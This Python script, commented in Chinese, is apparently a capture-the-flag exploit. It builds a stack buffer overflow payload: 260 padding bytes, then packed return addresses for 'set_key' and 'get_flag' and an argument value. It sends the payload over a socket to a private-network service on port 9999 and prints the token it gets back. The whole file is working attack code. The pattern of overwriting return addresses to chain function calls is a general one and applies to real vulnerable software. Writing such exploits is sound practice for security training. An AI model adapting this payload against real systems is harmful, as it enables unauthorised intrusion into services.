import socket
import struct
import ctypes

# 获取token的服务器地址，固定
TARGET_HOST = "172.17.218.103"
TARGET_PORT = 9999

GET_FLAG = 0x00401010 # get_flag函数地址
SET_KEY = 0x00401000 # set_key函数地址
OFFSET = 256 + 4 # 栈偏移
param1 = ctypes.c_uint32(-0x35014542).value  # 将负数转换为无符号整数

def get_token():
    payload = b"A" * OFFSET
    payload += struct.pack("<I", SET_KEY) # 第一层返回地址
    payload += struct.pack("<I", GET_FLAG) # 第二层返回地址
    payload += struct.pack("<I", param1) # set_key函数的参数
    payload += b"\n"

    with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10) as sock:
        sock.settimeout(5)

        banner = sock.recv(1024)
        print(banner.decode(errors="replace"), end="")

        sock.sendall(payload)

        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break

    text = response.decode(errors="replace")
    print(text)

    return text

if __name__ == "__main__":
    get_token()